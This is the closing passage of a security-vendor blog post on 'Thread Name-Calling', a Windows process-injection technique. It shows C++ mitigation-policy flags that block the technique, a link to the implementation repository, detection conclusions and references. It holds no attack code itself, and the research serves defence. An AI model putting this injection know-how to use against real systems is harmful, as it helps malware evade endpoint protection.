<div class="enlighter-default enlighter-v-standard enlighter-t-dracula enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">  DWORD64 MitgFlags = PROCESS_CREATION_MITIGATION_POLICY_CONTROL_FLOW_GUARD_ALWAYS_ON</span></div></div><div class=""><div><span class="enlighter-text">        | PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON </span><span class="enlighter-c0">// won't work with the version calling VirtualProtect/VirtualAlloc via ROP</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        | PROCESS_CREATION_MITIGATION_POLICY_HEAP_TERMINATE_ALWAYS_ON</span></div></div><div class=""><div><span class="enlighter-text">        | PROCESS_CREATION_MITIGATION_POLICY_BOTTOM_UP_ASLR_ALWAYS_ON</span></div></div><div class=""><div><span class="enlighter-text">        | PROCESS_CREATION_MITIGATION_POLICY_HIGH_ENTROPY_ASLR_ALWAYS_ON</span></div></div><div class=""><div><span class="enlighter-text">        | PROCESS_CREATION_MITIGATION_POLICY_STRICT_HANDLE_CHECKS_ALWAYS_ON</span></div></div><div class=""><div><span class="enlighter-text">        | PROCESS_CREATION_MITIGATION_POLICY_EXTENSION_POINT_DISABLE_ALWAYS_ON</span></div></div><div class=""><div><span class="enlighter-text">        | PROCESS_CREATION_MITIGATION_POLICY_IMAGE_LOAD_NO_REMOTE_ALWAYS_ON</span></div></div><div class=""><div><span class="enlighter-text">        | PROCESS_CREATION_MITIGATION_POLICY2_MODULE_TAMPERING_PROTECTION_ALWAYS_ON</span></div></div><div class=""><div><span class="enlighter-text">        ;</span></div></div></div><div class="enlighter-raw">  DWORD64 MitgFlags = PROCESS_CREATION_MITIGATION_POLICY_CONTROL_FLOW_GUARD_ALWAYS_ON
        | PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON // won't work with the version calling VirtualProtect/VirtualAlloc via ROP
        | PROCESS_CREATION_MITIGATION_POLICY_HEAP_TERMINATE_ALWAYS_ON
        | PROCESS_CREATION_MITIGATION_POLICY_BOTTOM_UP_ASLR_ALWAYS_ON
        | PROCESS_CREATION_MITIGATION_POLICY_HIGH_ENTROPY_ASLR_ALWAYS_ON
        | PROCESS_CREATION_MITIGATION_POLICY_STRICT_HANDLE_CHECKS_ALWAYS_ON
        | PROCESS_CREATION_MITIGATION_POLICY_EXTENSION_POINT_DISABLE_ALWAYS_ON
        | PROCESS_CREATION_MITIGATION_POLICY_IMAGE_LOAD_NO_REMOTE_ALWAYS_ON
        | PROCESS_CREATION_MITIGATION_POLICY2_MODULE_TAMPERING_PROTECTION_ALWAYS_ON
        ;</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">  DWORD64 MitgFlags = PROCESS_CREATION_MITIGATION_POLICY_CONTROL_FLOW_GUARD_ALWAYS_ON
        | PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON // won't work with the version calling VirtualProtect/VirtualAlloc via ROP
        | PROCESS_CREATION_MITIGATION_POLICY_HEAP_TERMINATE_ALWAYS_ON
        | PROCESS_CREATION_MITIGATION_POLICY_BOTTOM_UP_ASLR_ALWAYS_ON
        | PROCESS_CREATION_MITIGATION_POLICY_HIGH_ENTROPY_ASLR_ALWAYS_ON
        | PROCESS_CREATION_MITIGATION_POLICY_STRICT_HANDLE_CHECKS_ALWAYS_ON
        | PROCESS_CREATION_MITIGATION_POLICY_EXTENSION_POINT_DISABLE_ALWAYS_ON
        | PROCESS_CREATION_MITIGATION_POLICY_IMAGE_LOAD_NO_REMOTE_ALWAYS_ON
        | PROCESS_CREATION_MITIGATION_POLICY2_MODULE_TAMPERING_PROTECTION_ALWAYS_ON
        ;</pre>



<p class="wp-block-paragraph">Thread Name-Calling won’t work on processes that have the following mitigation policy set:</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-dracula enlighter-l-generic enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">PROCESS_CREATION_MITIGATION_POLICY_WIN32K_SYSTEM_CALL_DISABLE_ALWAYS_ON</span></div></div></div><div class="enlighter-raw">PROCESS_CREATION_MITIGATION_POLICY_WIN32K_SYSTEM_CALL_DISABLE_ALWAYS_ON</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">PROCESS_CREATION_MITIGATION_POLICY_WIN32K_SYSTEM_CALL_DISABLE_ALWAYS_ON</pre>



<h2 class="wp-block-heading" id="source-code">Source code</h2>



<p class="wp-block-paragraph">The complete source code, containing the implementation of described techniques, can be found in the following repository:</p>



<p class="wp-block-paragraph"><a href="https://github.com/hasherezade/thread_namecalling">https://github.com/hasherezade/thread_namecalling</a></p>



<h2 class="wp-block-heading" id="conclusions">Conclusions</h2>



<p class="wp-block-paragraph">As new APIs are added to Windows, new ideas for injection techniques are appearing. To implement effective detection we must always keep an eye on the changing landscape. Fortunately, Microsoft also works on implementing more visibility for anti-malware products, and currently most of the important APIs can be monitored with the help of&nbsp;<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/devtest/event-tracing-for-windows--etw-">ETW events</a>.</p>



<p class="wp-block-paragraph">Thread Name-Calling uses some of the relatively new APIs. However, it cannot avoid incorporating older well-known components, such as APC injections – APIs which should always be taken into consideration as a potential threat. Similarly, the manipulation of access rights within a remote process is a suspicious activity. However, even those indicators, when used out of the typical sequence of calls, may be overlooked by some of the AV and EDR products.</p>



<p class="wp-block-paragraph"><em><strong>Check Point customers remain protected from the threats described in this research.</strong></em></p>



<p class="wp-block-paragraph"><em><strong>Check Point’s&nbsp;<a href="https://www.checkpoint.com/infinity/zero-day-protection/">Threat Emulation</a>&nbsp;provides comprehensive coverage of attack tactics, file types, and operating systems&nbsp;and&nbsp;has developed and deployed a signature to detect and protect customers against threats described in this research.</strong></em></p>



<p class="wp-block-paragraph"><em><strong>Check Point’s&nbsp;<a href="https://www.checkpoint.com/harmony/advanced-endpoint-protection/">Harmony Endpoint</a>&nbsp;provides comprehensive endpoint protection at the highest security level, crucial to avoid security breaches and data compromise. Behavioral Guard protections were developed and deployed to protect customers against the threats described in this research.</strong></em></p>



<p class="wp-block-paragraph"><strong>TE/Harmony Endpoint protections:</strong></p>



<p class="wp-block-paragraph"><em>Behavioral.Win.ImageModification.C </em></p>



<p class="wp-block-paragraph"><em>Behavioral.Win.ImageModification.F</em></p>



<h2 class="wp-block-heading" id="references">References</h2>



<p class="wp-block-paragraph"><a href="https://attack.mitre.org/techniques/T1055">https://attack.mitre.org/techniques/T1055</a></p>



<p class="wp-block-paragraph"><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All-wp.pdf">https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All-wp.pdf</a></p>



<p class="wp-block-paragraph"><a href="https://twitter.com/Hexacorn/status/1317424213951733761">https://twitter.com/Hexacorn/status/1317424213951733761</a></p>



<p class="wp-block-paragraph"><a href="https://twitter.com/_Gal_Yaniv/status/1353630677493837825">https://twitter.com/_Gal_Yaniv/status/1353630677493837825</a></p>



<p class="wp-block-paragraph"><a href="https://blahcat.github.io/posts/2019/03/17/small-dumps-in-the-big-pool.html">https://blahcat.github.io/posts/2019/03/17/small-dumps-in-the-big-pool.html</a></p>



<p class="wp-block-paragraph"><a href="https://www.unknowncheats.me/forum/general-programming-and-reversing/596888-communicating-thread-name.html">https://www.unknowncheats.me/forum/general-programming-and-reversing/596888-communicating-thread-name.html</a></p>



<p class="wp-block-paragraph"><a href="https://gitlab.com/ORCA000/t.d.p">https://gitlab.com/ORCA000/t.d.p</a></p>



<p class="wp-block-paragraph"><a href="https://www.lodsb.com/shellcode-injection-using-threadnameinformation">https://www.lodsb.com/shellcode-injection-using-threadnameinformation</a></p>



<p class="wp-block-paragraph"><a href="https://modexp.wordpress.com/2019/08/27/process-injection-apc/">https://modexp.wordpress.com/2019/08/27/process-injection-apc/</a></p>



<p class="wp-block-paragraph"><a href="https://repnz.github.io/posts/apc/user-apc/#ntqueueapcthreadex-meet-special-user-apc">https://repnz.github.io/posts/apc/user-apc/#ntqueueapcthreadex-meet-special-user-apc</a></p>



<p class="wp-block-paragraph"><a href="https://www.deepinstinct.com/blog/inject-me-x64-injection-less-code-injection">https://www.deepinstinct.com/blog/inject-me-x64-injection-less-code-injection</a></p>
					</div>			
				</div>
				 
				<div class="back-to-top">
					<a href="https://research.checkpoint.com/2024/thread-name-calling-using-thread-name-for-offense/#single-post">
										<div class="image center">
						<img src="https://research.checkpoint.com/wp-content/uploads/2022/10/back_arrow.svg" alt="" width="300" height="150">
					</div>
										
											GO UP							
					</a>
				</div>
										<div class="button-wrap center">
						<a class="button background-skyblue font-white skyblue-border" href="https://research.checkpoint.com/latest-publications/">BACK TO ALL POSTS</a>
					</div>
						

			</div>
			 
				<div class="flex-4">
					
<div class="sidebar-post-wrapper">
		<div class="sidebar-post-inner">
					</div>
				<div class="sidebar-post-categories popular">
				<div class="aside-box">
					<h2>POPULAR POSTS</h2>
				<div class="blog-most-popular font-white">
									<div class="blog-most-popular-row relative">
										<a class="background-image" href="https://research.checkpoint.com/2023/opwnai-cybercriminals-starting-to-use-chatgpt/" style="background-image: url(https://research.checkpoint.com/wp-content/uploads/2023/01/AI-1059x529-copy.jpg);">
						<img src="https://research.checkpoint.com/wp-content/uploads/2023/01/AI-1059x529-copy.jpg" alt="">						</a>
								<div class="title">
					<ul class="top-content category-wraper">
													<li>Artificial Intelligence</li>													<li>ChatGPT</li>													<li>Check Point Research Publications</li>											</ul>
					<a href="https://research.checkpoint.com/2023/opwnai-cybercriminals-starting-to-use-chatgpt/">OPWNAI : Cybercriminals Starting to Use ChatGPT</a>
				</div>
			</div>
									<div class="blog-most-popular-row relative">
										<a class="background-image" href="https://research.checkpoint.com/2019/hacking-fortnite/" style="background-image: url(https://research.checkpoint.com/wp-content/uploads/2019/01/Fortnite_1021x580.jpg);">
						<img src="https://research.checkpoint.com/wp-content/uploads/2019/01/Fortnite_1021x580.jpg" alt="">						</a>
								<div class="title">
					<ul class="top-content category-wraper">
													<li>Check Point Research Publications</li>													<li>Threat Research</li>											</ul>
					<a href="https://research.checkpoint.com/2019/hacking-fortnite/">Hacking Fortnite Accounts</a>
				</div>
			</div>
									<div class="blog-most-popular-row relative">
										<a class="background-image" href="https://research.checkpoint.com/2022/opwnai-ai-that-can-save-the-day-or-hack-it-away/" style="background-image: url(https://research.checkpoint.com/wp-content/uploads/2022/12/OpenAIchatGPT_header.jpg);">
						<img src="https://research.checkpoint.com/wp-content/uploads/2022/12/OpenAIchatGPT_header.jpg" alt="">						</a>
								<div class="title">
					<ul class="top-content category-wraper">
													<li>Artificial Intelligence</li>													<li>ChatGPT</li>													<li>Check Point Research Publications</li>											</ul>
					<a href="https://research.checkpoint.com/2022/opwnai-ai-that-can-save-the-day-or-hack-it-away/">OpwnAI: AI That Can Save the Day or HACK it Away</a>
				</div>
			</div>
					</div>
	</div>
		</div>
		</div>  
				</div>
						
		</div>
	</div>
		
		 

<div class="aside-box">
	<div class="container container-wide">
	<div class="text font-blue-- section-title">
		<h3>BLOGS AND PUBLICATIONS</h3>
	</div>
	</div>
					<div class="blog-most-recent font-white slick-initialized slick-slider slick-dotted" role="toolbar">
														<div aria-live="polite" class="slick-list draggable" style="padding: 0px 30px; height: 164.438px;"><div class="slick-track" role="listbox" style="opacity: 1; width: 15000px; transform: translate3d(-204px, 0px, 0px);"><div class="blog-slide slick-slide slick-cloned" data-slick-index="-2" id="" aria-hidden="true" tabindex="-1">
						<div class="box relative">
														<a class="image background-image--" href="https://research.checkpoint.com/2017/the-next-wannacry-vulnerability-is-here/" style="background-image: url('https://research.checkpoint.com/wp-content/uploads/2017/08/WannaCry-Post-No-Image-1021x450.jpg')" tabindex="-1">
								<img src="https://research.checkpoint.com/wp-content/uploads/2017/08/WannaCry-Post-No-Image-1021x450.jpg" alt="">
							</a>
							<ul class="top-content category-wraper">
																	<li>Check Point Research Publications</li>															</ul>
							<div class="text">
								<span class="date small-font">August 11, 2017</span>
								<h3>“The Next WannaCry” Vulnerability is Here</h3>
							</div>
						</div>
					</div><div class="blog-slide slick-slide slick-cloned" data-slick-index="-1" id="" aria-hidden="true" tabindex="-1">
						<div class="box relative">
														<a class="image background-image--" href="https://research.checkpoint.com/2018/rubyminer-cryptominer-affects-30-ww-networks/" style="background-image: url('https://research.checkpoint.com/wp-content/uploads/2018/01/rubyminer.jpg')" tabindex="-1">
								<img src="https://research.checkpoint.com/wp-content/uploads/2018/01/rubyminer.jpg" alt="">
							</a>
							<ul class="top-content category-wraper">
																	<li>Check Point Research Publications</li>															</ul>
							<div class="text">
								<span class="date small-font">January 11, 2018</span>
								<h3>‘RubyMiner’ Cryptominer Affects 30% of WW Networks</h3>
							</div>
						</div>
					</div><div class="blog-slide slick-slide slick-current slick-active slick-center" data-slick-index="0" aria-hidden="false" tabindex="-1" role="option" aria-describedby="slick-slide00">
						<div class="box relative">
														<a class="image background-image--" href="https://research.checkpoint.com/2020/the-turkish-rat-distributes-evolved-adwind-in-a-massive-ongoing-phishing-campaign/" style="background-image: url('https://research.checkpoint.com/wp-content/uploads/2020/02/CheckPointResearchTurkishRat_blog_header.jpg')" tabindex="0">
								<img src="https://research.checkpoint.com/wp-content/uploads/2020/02/CheckPointResearchTurkishRat_blog_header.jpg" alt="">
							</a>
							<ul class="top-content category-wraper">
																	<li>Check Point Research Publications</li>																	<li>Global Cyber Attack Reports</li>																	<li>Threat Research</li>															</ul>
							<div class="text">
								<span class="date small-font">February 17, 2020</span>
								<h3>“The Turkish Rat” Evolved Adwind in a Massive Ongoing Phishing Campaign</h3>
							</div>
						</div>
					</div><div class="blog-slide slick-slide" data-slick-index="1" aria-hidden="true" tabindex="-1" role="option" aria-describedby="slick-slide01">
						<div class="box relative">
														<a class="image background-image--" href="https://research.checkpoint.com/2017/the-next-wannacry-vulnerability-is-here/" style="background-image: url('https://research.checkpoint.com/wp-content/uploads/2017/08/WannaCry-Post-No-Image-1021x450.jpg')" tabindex="-1">
								<img src="https://research.checkpoint.com/wp-content/uploads/2017/08/WannaCry-Post-No-Image-1021x450.jpg" alt="">
							</a>
							<ul class="top-content category-wraper">
																	<li>Check Point Research Publications</li>															</ul>
							<div class="text">
								<span class="date small-font">August 11, 2017</span>
								<h3>“The Next WannaCry” Vulnerability is Here</h3>
							</div>
						</div>
					</div><div class="blog-slide slick-slide" data-slick-index="2" aria-hidden="true" tabindex="-1" role="option" aria-describedby="slick-slide02">
						<div class="box relative">
														<a class="image background-image--" href="https://research.checkpoint.com/2018/rubyminer-cryptominer-affects-30-ww-networks/" style="background-image: url('https://research.checkpoint.com/wp-content/uploads/2018/01/rubyminer.jpg')" tabindex="-1">
								<img src="https://research.checkpoint.com/wp-content/uploads/2018/01/rubyminer.jpg" alt="">
							</a>
							<ul class="top-content category-wraper">
																	<li>Check Point Research Publications</li>															</ul>
							<div class="text">
								<span class="date small-font">January 11, 2018</span>
								<h3>‘RubyMiner’ Cryptominer Affects 30% of WW Networks</h3>
							</div>
						</div>
					</div><div class="blog-slide slick-slide slick-cloned slick-center" data-slick-index="3" id="" aria-hidden="true" tabindex="-1">
						<div class="box relative">
														<a class="image background-image--" href="https://research.checkpoint.com/2020/the-turkish-rat-distributes-evolved-adwind-in-a-massive-ongoing-phishing-campaign/" style="background-image: url('https://research.checkpoint.com/wp-content/uploads/2020/02/CheckPointResearchTurkishRat_blog_header.jpg')" tabindex="-1">
								<img src="https://research.checkpoint.com/wp-content/uploads/2020/02/CheckPointResearchTurkishRat_blog_header.jpg" alt="">
							</a>
							<ul class="top-content category-wraper">
																	<li>Check Point Research Publications</li>																	<li>Global Cyber Attack Reports</li>																	<li>Threat Research</li>															</ul>
							<div class="text">
								<span class="date small-font">February 17, 2020</span>
								<h3>“The Turkish Rat” Evolved Adwind in a Massive Ongoing Phishing Campaign</h3>
							</div>
						</div>
					</div><div class="blog-slide slick-slide slick-cloned" data-slick-index="4" id="" aria-hidden="true" tabindex="-1">
						<div class="box relative">
														<a class="image background-image--" href="https://research.checkpoint.com/2017/the-next-wannacry-vulnerability-is-here/" style="background-image: url('https://research.checkpoint.com/wp-content/uploads/2017/08/WannaCry-Post-No-Image-1021x450.jpg')" tabindex="-1">
								<img src="https://research.checkpoint.com/wp-content/uploads/2017/08/WannaCry-Post-No-Image-1021x450.jpg" alt="">
							</a>
							<ul class="top-content category-wraper">
																	<li>Check Point Research Publications</li>															</ul>
							<div class="text">
								<span class="date small-font">August 11, 2017</span>
								<h3>“The Next WannaCry” Vulnerability is Here</h3>
							</div>
						</div>
					</div></div></div>
														
														
								
			<ul class="slick-dots" style="" role="tablist"><li class="slick-active" aria-hidden="false" role="presentation" aria-selected="true" aria-controls="navigation00" id="slick-slide00"><button type="button" data-role="none" role="button" tabindex="0">1</button></li><li aria-hidden="true" role="presentation" aria-selected="false" aria-controls="navigation01" id="slick-slide01"><button type="button" data-role="none" role="button" tabindex="0">2</button></li><li aria-hidden="true" role="presentation" aria-selected="false" aria-controls="navigation02" id="slick-slide02"><button type="button" data-role="none" role="button" tabindex="0">3</button></li></ul></div>
			<div class="progress blog-most-recent-bar" role="progressbar" aria-valuemin="0" aria-valuemax="100">
				<span class="slider__label sr-only blog-recent-bar"> </span>
			</div>
		</div>	
</section>






<div id="cookies-notice" class="cookies-notice background-white" style="display: block;">
	<div class="container container-wide">
		<div class="flex-row">
			<div class="flex-8">
				<div class="text text-black"><h2>We value your privacy!</h2>
<p>BFSI uses cookies on this site. We use cookies to enable faster and easier experience for you. By continuing to visit this website you agree to our use of cookies.</p>
				</div>
			</div>
			<div class="flex-4">
				<div class="button-wrap justify-content-end">
					<div id="cn-accept-cookies" class="button font-white background-skyblue skyblue-border margin-right">ACCEPT</div>
					<div class="button transparent cookie-close font-white skyblue-border skyblue-font">REJECT</div>
				</div>
			</div>
			<div class="close-button cookie-close svg">
				<svg xmlns="http://www.w3.org/2000/svg" width="16.828" height="16.828" viewBox="0 0 16.828 16.828">
					<g id="Group_163304" data-name="Group 163304" transform="translate(1.414 1.414)"><line id="Line_323" data-name="Line 323" x2="14" y2="14" fill="none" stroke="#fff" stroke-linecap="round" stroke-width="2"></line><line id="Line_324" data-name="Line 324" x1="14" y2="14" fill="none" stroke="#fff" stroke-linecap="round" stroke-width="2"></line></g></svg>
				</div>
			</div>
		</div>
	</div>
















</body></html>